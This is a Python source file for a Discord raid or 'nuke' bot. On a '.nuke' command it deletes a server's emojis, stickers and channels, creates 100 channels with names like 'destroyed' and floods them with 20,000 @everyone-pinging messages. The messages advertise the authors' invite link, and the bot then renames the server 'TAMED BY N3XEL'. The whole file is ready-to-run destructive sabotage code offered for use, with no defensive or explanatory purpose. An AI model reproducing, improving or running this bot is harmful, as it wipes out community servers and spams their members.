# dnezRaider - Custom nuke bot (ULTIMATE EDITION)

import asyncio
import discord
from discord.ext import commands
import random
import time
import os

# --- CONFIGURE THESE ---
BOT_TOKEN = os.getenv("TOKEN", "PUT YOUR BOT TOKEN HERE")
PREFIX = "."

# Channel names (the fancy ones u gave)
RANDOM_CHANNEL_NAMES = [
    "𝔫𝔦𝔤𝔥𝔱𝔪𝔞𝔯𝔢 𝔦𝔰 𝔥𝔢𝔯𝔢",
    "ɴɪɢʜᴛᴍᴀʀᴇ ɪs ʜᴇʀᴇ",
    "ⁿⁱᵍʰᵐᵃʳᵉ ⁱˢ ʰᵉʳᵉ",
    "₦ł₲Ⱨ₮₥₳ⱤɆ ł₴ ⱧɆⱤɆ",
    "d̸e̸st̸r̸o̸y̸e̸d̸",
    "n҈i҈g҈h҈m҈a҈r҈e҈ i҈s҈ h҈e҈r҈e҈",
    "d҉e҉s҉t҉r҉o҉y҉e҉d҉d",
    "dєstrσчєd",
    "n̶i̶g̶h̶t̶m̶a̶r̶e̶"
]
USE_RANDOM_NAMES = True   # use random fancy names from above
CHANNEL_NAME = "nuked"   # fallback if random disabled

# The spam message (exactly as u gave)
MESSAGE = """# NUKED BY N3XL 
N3XEL ON TOP join da server NOW FOR FREE NUKE BOT 2026!
https://discord.gg/pbtxaTf8Q4
https://media1.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHRleGlwcWllOWl6MnNvYWU3N3V4NXJveXcya2oyeXEwZDZmaW9heSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/Eg41D2Obf58kpy8aaK/giphy.gif
||@everyone|| ||@here||"""

AMOUNT_OF_CHANNELS = 100
MESSAGES_PER_CHANNEL = 200   # each channel gets 200 messages
AMOUNT_OF_MESSAGES = AMOUNT_OF_CHANNELS * MESSAGES_PER_CHANNEL   # 20000 total

# New server name after nuke
NEW_SERVER_NAME = "TAMED BY N3XEL"

# -----------------------
# DO NOT MODIFY BEYOND THIS POINT UNLESS YOU KNOW WHAT YOU'RE DOING!
# -----------------------

def get_channel_name():
    if USE_RANDOM_NAMES and RANDOM_CHANNEL_NAMES:
        return random.choice(RANDOM_CHANNEL_NAMES)
    return CHANNEL_NAME

intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.message_content = True
intents.emojis_and_stickers = True

bot = commands.Bot(command_prefix=PREFIX, intents=intents)

async def delete_all_emojis(guild):
    emojis = guild.emojis
    if not emojis:
        return
    print(f"deleting {len(emojis)} emojis")
    await asyncio.gather(*(e.delete() for e in emojis), return_exceptions=True)
    print("emojis gone")

async def delete_all_stickers(guild):
    stickers = guild.stickers
    if not stickers:
        return
    print(f"deleting {len(stickers)} stickers")
    await asyncio.gather(*(s.delete() for s in stickers), return_exceptions=True)
    print("stickers gone")

async def rename_guild(guild):
    try:
        await guild.edit(name=NEW_SERVER_NAME)
        print(f"server renamed to {NEW_SERVER_NAME}")
    except Exception as e:
        print(f"rename failed: {e}")

async def send_messages_fast(channels, message, total):
    if not channels:
        return
    
    semaphore = asyncio.Semaphore(50)
    
    async def send_with_limit(channel, msg):
        async with semaphore:
            try:
                await channel.send(msg)
            except Exception:
                pass
    
    tasks = []
    for i in range(total):
        channel = channels[i % len(channels)]
        tasks.append(send_with_limit(channel, message))
    
    await asyncio.gather(*tasks, return_exceptions=True)

async def nuke_server(guild: discord.Guild):
    print(f"Starting nuke on {guild.name} ({guild.id})")
    start_time = time.perf_counter()

    # Delete emojis & stickers
    await delete_all_emojis(guild)
    await delete_all_stickers(guild)

    # Delete all channels
    print("Deleting all channels...")
    await asyncio.gather(
        *(channel.delete() for channel in guild.channels),
        return_exceptions=True
    )

    # Create new channels
    print(f"Creating {AMOUNT_OF_CHANNELS} channels...")
    async def create_raid_channel():
        return await guild.create_text_channel(get_channel_name())
    
    channels = await asyncio.gather(
        *(create_raid_channel() for _ in range(AMOUNT_OF_CHANNELS)),
        return_exceptions=True
    )

    # Send messages
    text_channels = [c for c in channels if isinstance(c, discord.TextChannel)]
    if text_channels:
        print(f"Sending {AMOUNT_OF_MESSAGES} messages ({MESSAGES_PER_CHANNEL} per channel)...")
        await send_messages_fast(text_channels, MESSAGE, AMOUNT_OF_MESSAGES)

    # Rename server
    await rename_guild(guild)

    elapsed = time.perf_counter() - start_time
    print(f"Nuke completed in {elapsed:.2f} seconds!")

@bot.event
async def on_ready():
    print(f"Bot is online as {bot.user}")
    print(f"Prefix: {PREFIX}")
    print(f"Command: {PREFIX}nuke")
    print("=" * 50)

@bot.command(name="nuke")
async def nuke(ctx):
    if not ctx.author.guild_permissions.administrator:
        await ctx.send("❌ You need Administrator permission to use this command!")
        return
    await ctx.send("eto na mga pukinangina)")
    await nuke_server(ctx.guild)

@bot.command(name="config")
async def config(ctx):
    config_msg = f"""
**Current Configuration:**
📝 Channel Names: `{len(RANDOM_CHANNEL_NAMES)} fancy variants`
🎲 Random Names: `{'Enabled' if USE_RANDOM_NAMES else 'Disabled'}`
💬 Message Preview: `{MESSAGE[:60]}...`
📊 Channels: `{AMOUNT_OF_CHANNELS}`
📨 Messages per Channel: `{MESSAGES_PER_CHANNEL}`
📨 Total Messages: `{AMOUNT_OF_MESSAGES}`
🏷️ New Server Name: `{NEW_SERVER_NAME}`
    """
    await ctx.send(config_msg)

if __name__ == "__main__":
    if BOT_TOKEN == "PUT YOUR BOT TOKEN HERE" and not os.getenv("TOKEN"):
        print("❌ Set your TOKEN environment variable or hardcode it.")
        exit(1)
    print("Starting Nuke Bot...")
    print("=" * 50)
    bot.run(BOT_TOKEN)
